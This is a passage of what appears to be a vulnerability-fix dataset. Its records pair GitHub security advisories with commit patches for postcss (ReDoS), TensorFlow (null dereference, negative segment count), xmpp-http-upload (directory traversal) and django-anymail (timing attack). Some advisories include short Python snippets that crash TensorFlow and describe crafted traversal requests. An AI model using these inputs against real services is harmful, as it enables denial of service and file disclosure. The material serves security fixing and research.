'')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/previous-map.js'])","num_files":1.0},{"index":2148,"vuln_id":"GHSA-hwj9-h5mp-3pm3","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/postcss\/postcss\/commit\/54cbf3c4847eb0fb1501b9d2337465439e849734', 'https:\/\/github.com\/postcss\/postcss\/commit\/b6f3e4d5a8d7504d553267f80384373af3a3dec5', 'https:\/\/github.com\/postcss\/postcss\/commit\/8682b1e4e328432ba692bed52326e84439cec9e4'}","dataset":"osv","summary":"Regular Expression Denial of Service in postcss The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.","published_date":"2021-05-10","chain_len":3,"project":"https:\/\/github.com\/postcss\/postcss","commit_href":"https:\/\/github.com\/postcss\/postcss\/commit\/8682b1e4e328432ba692bed52326e84439cec9e4","commit_sha":"8682b1e4e328432ba692bed52326e84439cec9e4","patch":"MULTI","chain_ord":"['8682b1e4e328432ba692bed52326e84439cec9e4', 'b6f3e4d5a8d7504d553267f80384373af3a3dec5', '54cbf3c4847eb0fb1501b9d2337465439e849734']","before_first_fix_commit":"{'12832f3d203474bd273bd06bd3b2407567bfe09e'}","last_fix_commit":"54cbf3c4847eb0fb1501b9d2337465439e849734","chain_ord_pos":1.0,"commit_datetime":"04\/08\/2021, 06:57:25","message":"Fix unsafe regexp","author":"Andrey Sitnik","comments":"{'com_1': {'author': 'aw3218', 'datetime': '04\/19\/2021, 18:32:44', 'body': 'Any chance of getting this change into a 7.0.36 version?'}, 'com_2': {'author': 'ai', 'datetime': '04\/19\/2021, 18:35:03', 'body': '7.x support is over on Jan 1, 2020.\\r\\n\\r\\nThe issue is not so critical (it affects only online tools like CodePen). It is better to use this reason to update to PostCSS 8.'}, 'com_3': {'author': 'aw3218', 'datetime': '04\/19\/2021, 18:43:33', 'body': \"Angular 11 is calling cssnano@4.1.10 which calls version 7.0.35. Updating to cssnano@5.0.1 won't compile angular 11.\\r\\n\\r\\n`-- @angular-devkit\/build-angular@0.1102.7\\r\\n  +-- css-loader@5.0.1\\r\\n  | `-- postcss@8.2.10\\r\\n  +-- **cssnano@4.1.10**\\r\\n  | +-- cssnano-preset-default@4.0.8\\r\\n  | | +-- css-declaration-sorter@4.0.1\\r\\n  | | | `-**- postcss@7.0.35**\"}, 'com_4': {'author': 'ai', 'datetime': '04\/19\/2021, 18:44:29', 'body': 'Ask Angular 11 to update cssnano.'}, 'com_5': {'author': 'GeorgiosP', 'datetime': '04\/21\/2021, 15:59:36', 'body': 'Would this effect any project using editors like [monaco-editor](https:\/\/github.com\/microsoft\/monaco-editor\/blob\/92d6800a00070f876faad9ee7997e9efea7c5e4b\/package-lock.json#L2825) which has postcss or other browser based code editors with a dependency on V7 of postcss \ud83d\udcad'}, 'com_6': {'author': 'ai', 'datetime': '04\/21\/2021, 16:10:07', 'body': '@GeorgiosP it affects only use cases when:\\r\\n\\r\\n1. User send you CSS\\r\\n2. You compile this CSS on your servers\\r\\n\\r\\nIn this case, the user can generate special CSS which will take seconds or minutes to compile. An attacker can use it to DoS your servers.\\r\\n\\r\\nIf you can\u2019t update PostCSS, you can add timeout for CSS processing.'}, 'com_7': {'author': 'GeorgiosP', 'datetime': '04\/21\/2021, 16:16:41', 'body': '@ai thanks for the additional context \ud83d\ude4f\ud83c\udffc'}, 'com_8': {'author': 'Sesughter01', 'datetime': '05\/17\/2021, 08:22:18', 'body': 'how do I upgrade from 8.1.14 to the patched 8.2.10 in my laravel project?'}, 'com_9': {'author': 'Kmap-Holdings', 'datetime': '05\/17\/2021, 11:18:13', 'body': 'Eagerly waiting for this answer'}, 'com_10': {'author': 'ai', 'datetime': '05\/17\/2021, 11:30:43', 'body': '@Sesughter01 `yarn upgrade` or `npm update` should update your nested dependencies. But it is better to ask in Laravel community.'}, 'com_11': {'author': 'josephzidell', 'datetime': '05\/21\/2021, 14:00:06', 'body': \"@ai We run a DevSecOps pipeline (gov't work), and these vulns are causing full blockages. Not every plugin is compatible with v8 at the moment. Seems like it's taking the community some time to make the jump. Would you consider cutting a 7.x release for this?\"}, 'com_12': {'author': 'ai', 'datetime': '05\/21\/2021, 14:11:11', 'body': '@josephzidell this vulnerability affects only runner (`postcss-loader`, `postcss-cli`, `gulp-postcss`) and only on web compilers accepting user-generated CSS (like CodePen).\\r\\n\\r\\nPostCSS in plugin dependencies doesn\u2019t affect by this vulnerability.\\r\\n\\r\\nPostCSS 7 support ended in January 2021.\\r\\n\\r\\nIf you want extended support, you can pay for PostCSS commercial support.'}, 'com_13': {'author': 'josaphatmayuba', 'datetime': '01\/13\/2022, 06:07:16', 'body': 'I have\\r\\n\\r\\n> npm update\\r\\n\\r\\n![image](https:\/\/user-images.githubusercontent.com\/97654468\/149274944-50df9859-8e4d-4d20-8532-e43bdfd949da.png)'}, 'com_14': {'author': 'hakkisabah', 'datetime': '01\/15\/2022, 08:45:37', 'body': \"> I have\\r\\n> \\r\\n> > npm update\\r\\n> \\r\\n> ![image](https:\/\/user-images.githubusercontent.com\/97654468\/149274944-50df9859-8e4d-4d20-8532-e43bdfd949da.png)\\r\\n\\r\\nI don't understand, i have same issue and even more...\\r\\n![Screenshot (11)](https:\/\/user-images.githubusercontent.com\/10910670\/149615701-8738f08d-e779-4fa6-9587-94c524e1d140.png)\"}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/previous-map.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/postcss\/postcss\/raw\/8682b1e4e328432ba692bed52326e84439cec9e4\/lib%2Fprevious-map.js', 'patch': '@@ -54,7 +54,7 @@ class PreviousMap {\\n   }\\n \\n   loadAnnotation(css) {\\n-    let annotations = css.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=.*\\\\s*\\\\*\\\\\/\/gm)\\n+    let annotations = css.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=.*\\\\*\\\\\/\/gm)\\n \\n     if (annotations && annotations.length > 0) {\\n       \/\/ Locate the last sourceMappingURL to avoid picking up'}}","message_norm":"fix unsafe regexp","language":"ca","entities":"[('fix', 'ACTION', ''), ('unsafe', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/previous-map.js'])","num_files":1.0},{"index":2151,"vuln_id":"GHSA-hwr7-8gxx-fj5p","cwe_id":"{'CWE-476'}","score":7.7,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/301ae88b331d37a2a16159b65b255f4f9eb39314'}","dataset":"osv","summary":"Null pointer dereference in `RaggedTensorToTensor` ### Impact\nSending invalid argument for `row_partition_types` of `tf.raw_ops.RaggedTensorToTensor` API results in a null pointer dereference and undefined behavior:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=1,\n  values=10,\n  default_value=21,\n  row_partition_tensors=tf.constant([0,0,0,0]),\n  row_partition_types=[])\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/47a06f40411a69c99f381495f490536972152ac0\/tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc#L328) accesses the first element of a user supplied list of values without validating that the provided list is not empty.\n\n### Patches\nWe have patched the issue in GitHub commit [301ae88b331d37a2a16159b65b255f4f9eb39314](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/301ae88b331d37a2a16159b65b255f4f9eb39314).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/301ae88b331d37a2a16159b65b255f4f9eb39314","commit_sha":"301ae88b331d37a2a16159b65b255f4f9eb39314","patch":"SINGLE","chain_ord":"['301ae88b331d37a2a16159b65b255f4f9eb39314']","before_first_fix_commit":"{'e787d206757e3e87b04ab7bafa8b1e4130a9f774'}","last_fix_commit":"301ae88b331d37a2a16159b65b255f4f9eb39314","chain_ord_pos":1.0,"commit_datetime":"07\/12\/2021, 16:59:54","message":"Fix null ptr deref in tf.raw_ops.RaggedTensorToTensor\n\nPiperOrigin-RevId: 384257511\nChange-Id: I0484ad285039d132d6c41b284a7fcdd2b774a38e","author":"Laura Pak","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/301ae88b331d37a2a16159b65b255f4f9eb39314\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_tensor_op.cc', 'patch': '@@ -348,6 +348,9 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n   Status GetFirstDimensionSize(OpKernelContext* context, INDEX_TYPE* result) {\\n     const Tensor first_partition_tensor =\\n         context->input(kFirstPartitionInputIndex);\\n+    if (row_partition_types_.empty()) {\\n+      return errors::InvalidArgument(\"No row_partition_types given.\");\\n+    }\\n     const RowPartitionType first_partition_type = row_partition_types_[0];\\n     switch (first_partition_type) {\\n       case RowPartitionType::FIRST_DIM_SIZE:'}}","message_norm":"fix null ptr deref in tf.raw_ops.raggedtensortotensor\n\npiperorigin-revid: 384257511\nchange-id: i0484ad285039d132d6c41b284a7fcdd2b774a38e","language":"en","entities":"[('fix', 'ACTION', ''), ('384257511', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc'])","num_files":1.0},{"index":2152,"vuln_id":"GHSA-hwv5-w8gm-fq9f","cwe_id":"{'CWE-22'}","score":3.5,"chain":"{'https:\/\/github.com\/horazont\/xmpp-http-upload\/commit\/82056540191e89f0cd697c81f57714c00962ed75'}","dataset":"osv","summary":"Directory Traversal vulnerability in GET\/PUT allows attackers to Disclose Information or Write Files via a crafted GET\/PUT request ### Impact\n\n#### Information Disclosure\n\nWhen the GET method is attacked, attackers can read files which have a `.data` suffix and which are accompanied by a JSON file with the `.meta` suffix. This can lead to Information Disclosure and in some shared-hosting scenarios also to circumvention of authentication or other limitations on the outbound (GET) traffic.\n\nFor example, in a scenario where a single server has multiple instances of the application running (with separate DATA_ROOT settings), an attacker who has knowledge about the directory structure is able to read files from any other instance to which the process has read access.\n\nIf instances have individual authentication (for example, HTTP authentication via a reverse proxy, source IP based filtering) or other restrictions (such as quotas), attackers may circumvent those limits in such a scenario by using the Directory Traversal to retrieve data from the other instances.\n\n#### File Write\n\nIf the associated XMPP server (or anyone knowing the SECRET_KEY) is malicious, they can write files outside the DATA_ROOT. The files which are written are constrained to have the `.meta` and the `.data` suffixes; the `.meta` file will contain the JSON with the Content-Type of the original request and the `.data` file will contain the payload.\n\n### Patches\n\nPR #12 fixes the issue. The PR has been merged into version 0.4.0 and 0.4.0 has been released and pushed to PyPI. Users are advised to upgrade immediately.\n\n### Workarounds\n\n- Apache can apparently be configured to filter such malicious paths when reverse-proxying. \n- There are no other workarounds known.\n\n### References\n\n- [Pull Request #12](https:\/\/github.com\/horazont\/xmpp-http-upload\/pull\/12)","published_date":"2020-10-06","chain_len":1,"project":"https:\/\/github.com\/horazont\/xmpp-http-upload","commit_href":"https:\/\/github.com\/horazont\/xmpp-http-upload\/commit\/82056540191e89f0cd697c81f57714c00962ed75","commit_sha":"82056540191e89f0cd697c81f57714c00962ed75","patch":"SINGLE","chain_ord":"['82056540191e89f0cd697c81f57714c00962ed75']","before_first_fix_commit":"{'f0fc7443c06a0e8aecb5696fc2bd513a2cc8b611'}","last_fix_commit":"82056540191e89f0cd697c81f57714c00962ed75","chain_ord_pos":1.0,"commit_datetime":"10\/05\/2020, 23:06:21","message":"Simplify path handling, use safe_join\n\nThe current implementation of sanitized_join did not handle\n\"..\" properly. The problem is, that .absolute() does not do\nwhat .resolve() does, but .resolve() does not work on non\nexistant paths.\n\nAnyway, flask has a function exactly for this: safe_join.\n\nSo let's use that one.\n\nWhile at it, simplified the whole path handling a bit.","author":"Christian Tacke","comments":null,"stats":"{'additions': 15, 'deletions': 34, 'total': 49}","files":"{'xhu.py': {'additions': 15, 'deletions': 34, 'changes': 49, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/horazont\/xmpp-http-upload\/raw\/82056540191e89f0cd697c81f57714c00962ed75\/xhu.py', 'patch': '@@ -29,6 +29,7 @@\\n import typing\\n \\n import flask\\n+import werkzeug.exceptions\\n \\n app = flask.Flask(\"xmpp-http-upload\")\\n app.config.from_envvar(\"XMPP_HTTP_UPLOAD_CONFIG\")\\n@@ -39,16 +40,11 @@\\n     CORS(app)\\n \\n \\n-def sanitized_join(path: str, root: pathlib.Path) -> pathlib.Path:\\n-    result = (root \/ path).absolute()\\n-    if not str(result).startswith(str(root) + \"\/\"):\\n-        raise ValueError(\"resulting path is outside root\")\\n-    return result\\n-\\n-\\n-def get_paths(base_path: pathlib.Path):\\n-    data_file = pathlib.Path(str(base_path) + \".data\")\\n-    metadata_file = pathlib.Path(str(base_path) + \".meta\")\\n+def get_paths(root: str, sub_path: str) \\\\\\n+        -> typing.Tuple[pathlib.Path, pathlib.Path]:\\n+    base_path = flask.safe_join(root, sub_path)\\n+    data_file = pathlib.Path(base_path + \".data\")\\n+    metadata_file = pathlib.Path(base_path + \".meta\")\\n \\n     return data_file, metadata_file\\n \\n@@ -58,15 +54,10 @@ def load_metadata(metadata_file):\\n         return json.load(f)\\n \\n \\n-def get_info(path: str, root: pathlib.Path) -> typing.Tuple[\\n+def get_info(path: str) -> typing.Tuple[\\n         pathlib.Path,\\n         dict]:\\n-    dest_path = sanitized_join(\\n-        path,\\n-        pathlib.Path(app.config[\"DATA_ROOT\"]),\\n-    )\\n-\\n-    data_file, metadata_file = get_paths(dest_path)\\n+    data_file, metadata_file = get_paths(app.config[\"DATA_ROOT\"], path)\\n \\n     return data_file, load_metadata(metadata_file)\\n \\n@@ -104,11 +95,8 @@ def stream_file(src, dest, nbytes):\\n @app.route(\"\/<path:path>\", methods=[\"PUT\"])\\n def put_file(path):\\n     try:\\n-        dest_path = sanitized_join(\\n-            path,\\n-            pathlib.Path(app.config[\"DATA_ROOT\"]),\\n-        )\\n-    except ValueError:\\n+        data_file, metadata_file = get_paths(app.config[\"DATA_ROOT\"], path)\\n+    except werkzeug.exceptions.NotFound:\\n         return flask.Response(\\n             \"Not Found\",\\n             404,\\n@@ -134,8 +122,7 @@ def put_file(path):\\n         \"application\/octet-stream\",\\n     )\\n \\n-    dest_path.parent.mkdir(parents=True, exist_ok=True, mode=0o770)\\n-    data_file, metadata_file = get_paths(dest_path)\\n+    data_file.parent.mkdir(parents=True, exist_ok=True, mode=0o770)\\n \\n     try:\\n         with write_file(data_file) as fout:\\n@@ -189,13 +176,10 @@ def generate_headers(response_headers, metadata_headers):\\n @app.route(\"\/<path:path>\", methods=[\"HEAD\"])\\n def head_file(path):\\n     try:\\n-        data_file, metadata = get_info(\\n-            path,\\n-            pathlib.Path(app.config[\"DATA_ROOT\"])\\n-        )\\n+        data_file, metadata = get_info(path)\\n \\n         stat = data_file.stat()\\n-    except (OSError, ValueError):\\n+    except (OSError, werkzeug.exceptions.NotFound):\\n         return flask.Response(\\n             \"Not Found\",\\n             404,\\n@@ -214,11 +198,8 @@ def head_file(path):\\n @app.route(\"\/<path:path>\", methods=[\"GET\"])\\n def get_file(path):\\n     try:\\n-        data_file, metadata = get_info(\\n-            path,\\n-            pathlib.Path(app.config[\"DATA_ROOT\"])\\n-        )\\n-    except (OSError, ValueError):\\n+        data_file, metadata = get_info(path)\\n+    except (OSError, werkzeug.exceptions.NotFound):\\n         return flask.Response(\\n             \"Not Found\",\\n             404,'}}","message_norm":"simplify path handling, use safe_join\n\nthe current implementation of sanitized_join did not handle\n\"..\" properly. the problem is, that .absolute() does not do\nwhat .resolve() does, but .resolve() does not work on non\nexistant paths.\n\nanyway, flask has a function exactly for this: safe_join.\n\nso let's use that one.\n\nwhile at it, simplified the whole path handling a bit.","language":"en","entities":"[('sanitized_join', 'SECWORD', ''), ('problem', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xhu.py'])","num_files":1.0},{"index":2157,"vuln_id":"GHSA-hx9q-2mx4-m4pg","cwe_id":"{'CWE-191', 'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20cb18724b0bf6c09071a3f53434c4eec53cc147', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/84563f265f28b3c36a15335c8b005d405260e943'}","dataset":"osv","summary":"Missing validation causes denial of service via `Conv3DBackpropFilterV2` ### Impact\nThe implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/unsorted_segment_join_op.cc#L83-L148) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.strings.unsorted_segment_join(\n  inputs=['123'],\n  segment_ids=[0],\n  num_segments=-1)\n```\n\nThe code assumes `num_segments` is a positive scalar but there is no validation:\n\n```cc\nconst Tensor& num_segments_tensor = context->input(2);\nauto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\n\/\/ ...\nTensor* output_tensor = nullptr;\nTensorShape output_shape =\n    GetOutputShape(input_shape, segment_id_shape, num_segments);\n```\n\nSince this value is used to allocate the output tensor, a negative value would result in a `CHECK`-failure (assertion failure), as per [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md).\n\n### Patches \nWe have patched the issue in GitHub commit [84563f265f28b3c36a15335c8b005d405260e943](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/84563f265f28b3c36a15335c8b005d405260e943) and GitHub commit [20cb18724b0bf6c09071a3f53434c4eec53cc147](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20cb18724b0bf6c09071a3f53434c4eec53cc147).\n  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n      \n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n                       \n### Attribution \nThis vulnerability has been reported externally via a [GitHub issue](https:\/\/github.com\/tensorflow\/tensorflow\/issues\/55305).","published_date":"2022-05-24","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20cb18724b0bf6c09071a3f53434c4eec53cc147","commit_sha":"20cb18724b0bf6c09071a3f53434c4eec53cc147","patch":"MULTI","chain_ord":"['84563f265f28b3c36a15335c8b005d405260e943', '20cb18724b0bf6c09071a3f53434c4eec53cc147']","before_first_fix_commit":"{'3f30e4965889b1b86b1d56392e437ccc08907f65'}","last_fix_commit":"20cb18724b0bf6c09071a3f53434c4eec53cc147","chain_ord_pos":2.0,"commit_datetime":"04\/20\/2022, 19:05:26","message":"Allow 0 for number of segments in `unsorted_segment_join_op.cc`\n\nRelated to the fix for #55305\n\nPiperOrigin-RevId: 443157549","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'tensorflow\/core\/kernels\/unsorted_segment_join_op.cc': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/20cb18724b0bf6c09071a3f53434c4eec53cc147\/tensorflow%2Fcore%2Fkernels%2Funsorted_segment_join_op.cc', 'patch': '@@ -94,8 +94,10 @@ class UnsortedSegmentJoinOp : public OpKernel {\\n                 errors::InvalidArgument(\"Number of segments cannot be empty.\"));\\n     auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\\n \\n-    OP_REQUIRES(context, num_segments > 0,\\n-                errors::InvalidArgument(\"Number of segments must be positive\"));\\n+    OP_REQUIRES(\\n+        context, num_segments >= 0,\\n+        errors::InvalidArgument(\\n+            \"Number of segments must be non-negative but got \", num_segments));\\n     OP_REQUIRES(context, segment_dims != 0,\\n                 errors::InvalidArgument(\"Segment_id cannot have rank 0\"));'}}","message_norm":"allow 0 for number of segments in `unsorted_segment_join_op.cc`\n\nrelated to the fix for #55305\n\npiperorigin-revid: 443157549","language":"en","entities":"[('#55305', 'ISSUE', ''), ('443157549', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/unsorted_segment_join_op.cc'])","num_files":1.0},{"index":2158,"vuln_id":"GHSA-hx9q-2mx4-m4pg","cwe_id":"{'CWE-191', 'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20cb18724b0bf6c09071a3f53434c4eec53cc147', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/84563f265f28b3c36a15335c8b005d405260e943'}","dataset":"osv","summary":"Missing validation causes denial of service via `Conv3DBackpropFilterV2` ### Impact\nThe implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/unsorted_segment_join_op.cc#L83-L148) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.strings.unsorted_segment_join(\n  inputs=['123'],\n  segment_ids=[0],\n  num_segments=-1)\n```\n\nThe code assumes `num_segments` is a positive scalar but there is no validation:\n\n```cc\nconst Tensor& num_segments_tensor = context->input(2);\nauto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\n\/\/ ...\nTensor* output_tensor = nullptr;\nTensorShape output_shape =\n    GetOutputShape(input_shape, segment_id_shape, num_segments);\n```\n\nSince this value is used to allocate the output tensor, a negative value would result in a `CHECK`-failure (assertion failure), as per [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md).\n\n### Patches \nWe have patched the issue in GitHub commit [84563f265f28b3c36a15335c8b005d405260e943](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/84563f265f28b3c36a15335c8b005d405260e943) and GitHub commit [20cb18724b0bf6c09071a3f53434c4eec53cc147](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20cb18724b0bf6c09071a3f53434c4eec53cc147).\n  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n      \n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n                       \n### Attribution \nThis vulnerability has been reported externally via a [GitHub issue](https:\/\/github.com\/tensorflow\/tensorflow\/issues\/55305).","published_date":"2022-05-24","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/84563f265f28b3c36a15335c8b005d405260e943","commit_sha":"84563f265f28b3c36a15335c8b005d405260e943","patch":"MULTI","chain_ord":"['84563f265f28b3c36a15335c8b005d405260e943', '20cb18724b0bf6c09071a3f53434c4eec53cc147']","before_first_fix_commit":"{'3f30e4965889b1b86b1d56392e437ccc08907f65'}","last_fix_commit":"20cb18724b0bf6c09071a3f53434c4eec53cc147","chain_ord_pos":1.0,"commit_datetime":"04\/15\/2022, 17:34:16","message":"Validate `num_segments > 0` in `unsorted_segment_join`\n\nFixes #55305\n\nPiperOrigin-RevId: 442047005","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/unsorted_segment_join_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/84563f265f28b3c36a15335c8b005d405260e943\/tensorflow%2Fcore%2Fkernels%2Funsorted_segment_join_op.cc', 'patch': '@@ -94,6 +94,8 @@ class UnsortedSegmentJoinOp : public OpKernel {\\n                 errors::InvalidArgument(\"Number of segments cannot be empty.\"));\\n     auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\\n \\n+    OP_REQUIRES(context, num_segments > 0,\\n+                errors::InvalidArgument(\"Number of segments must be positive\"));\\n     OP_REQUIRES(context, segment_dims != 0,\\n                 errors::InvalidArgument(\"Segment_id cannot have rank 0\"));'}}","message_norm":"validate `num_segments > 0` in `unsorted_segment_join`\n\nfixes #55305\n\npiperorigin-revid: 442047005","language":"ca","entities":"[('validate', 'ACTION', ''), ('fixes', 'ACTION', ''), ('#55305', 'ISSUE', ''), ('442047005', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/unsorted_segment_join_op.cc'])","num_files":1.0},{"index":2161,"vuln_id":"GHSA-hxf9-7h4c-f5jv","cwe_id":"{'CWE-200'}","score":9.1,"chain":"{'https:\/\/github.com\/anymail\/django-anymail\/commit\/db586ede1fbb41dce21310ea28ae15a1cf1286c5', 'https:\/\/github.com\/anymail\/django-anymail\/commit\/c07998304b4a31df4c61deddcb03d3607a04691b'}","dataset":"osv","summary":"Django-Anymail prone to a timing attack webhooks\/base.py in Anymail (aka django-anymail) before 1.2.1 is prone to a timing attack vulnerability on the WEBHOOK_AUTHORIZATION secret, which allows remote attackers to post arbitrary e-mail tracking events.","published_date":"2018-07-12","chain_len":2,"project":"https:\/\/github.com\/anymail\/django-anymail","commit_href":"https:\/\/github.com\/anymail\/django-anymail\/commit\/db586ede1fbb41dce21310ea28ae15a1cf1286c5","commit_sha":"db586ede1fbb41dce21310ea28ae15a1cf1286c5","patch":"MULTI","chain_ord":"['db586ede1fbb41dce21310ea28ae15a1cf1286c5', 'c07998304b4a31df4c61deddcb03d3607a04691b']","before_first_fix_commit":"{'7029298b930620b1655dab2548f72d6640a5905e'}","last_fix_commit":"c07998304b4a31df4c61deddcb03d3607a04691b","chain_ord_pos":1.0,"commit_datetime":"02\/02\/2018, 19:41:14","message":"Security: prevent timing attack on WEBHOOK_AUTHORIZATION secret\n\nAnymail's webhook validation was vulnerable to a timing attack.\nAn attacker could have used this to recover your WEBHOOK_AUTHORIZATION\nshared secret, potentially allowing them to post fabricated or malicious\nemail tracking events to your app.\n\nThere have not been any reports of attempted exploit in the wild. (The\nvulnerability was discovered through code review.) Attempts would be\nvisible in http logs as a very large number of 400 responses on\nAnymail's webhook urls, or in Python error monitoring as a very large\nnumber of AnymailWebhookValidationFailure exceptions.\n\nIf you are using Anymail's webhooks, you should upgrade to this release.\nIn addition, you may want to rotate to a new WEBHOOK_AUTHORIZATION\nsecret ([docs](http:\/\/anymail.readthedocs.io\/en\/stable\/tips\/securing_webhooks\/#use-a-shared-authorization-secret)),\nparticularly if your logs indicate attempted exploit.","author":"medmunds","comments":null,"stats":"{'additions': 12, 'deletions': 3, 'total': 15}","files":"{'anymail\/webhooks\/base.py': {'additions': 12, 'deletions': 3, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/anymail\/django-anymail\/raw\/db586ede1fbb41dce21310ea28ae15a1cf1286c5\/anymail%2Fwebhooks%2Fbase.py', 'patch': '@@ -2,6 +2,7 @@\\n \\n import six\\n from django.http import HttpResponse\\n+from django.utils.crypto import constant_time_compare\\n from django.utils.decorators import method_decorator\\n from django.views.decorators.csrf import csrf_exempt\\n from django.views.generic import View\\n@@ -40,8 +41,13 @@ def __init__(self, **kwargs):\\n     def validate_request(self, request):\\n         \"\"\"If configured for webhook basic auth, validate request has correct auth.\"\"\"\\n         if self.basic_auth:\\n-            basic_auth = get_request_basic_auth(request)\\n-            if basic_auth is None or basic_auth not in self.basic_auth:\\n+            request_auth = get_request_basic_auth(request)\\n+            # Use constant_time_compare to avoid timing attack on basic auth. (It\\'s OK that any()\\n+            # can terminate early: we\\'re not trying to protect how many auth strings are allowed,\\n+            # just the contents of each individual auth string.)\\n+            auth_ok = any(constant_time_compare(request_auth, allowed_auth)\\n+                          for allowed_auth in self.basic_auth)\\n+            if not auth_ok:\\n                 # noinspection PyUnresolvedReferences\\n                 raise AnymailWebhookValidationFailure(\\n                     \"Missing or invalid basic auth in Anymail %s webhook\" % self.esp_name)\\n@@ -77,8 +83,11 @@ def validate_request(self, request):\\n         *All* definitions of this method in the class chain (including mixins)\\n         will be called. There is no need to chain to the superclass.\\n         (See self.run_validators and collect_all_methods.)\\n+\\n+        Security note: use django.utils.crypto.constant_time_compare for string\\n+        comparisons, to avoid exposing your validation to a timing attack.\\n         \"\"\"\\n-        # if request.POST[\\'signature\\'] != expected_signature:\\n+        # if not constant_time_compare(request.POST[\\'signature\\'], expected_signature):\\n         #     raise AnymailWebhookValidationFailure(\"...message...\")\\n         # (else just do nothing)\\n         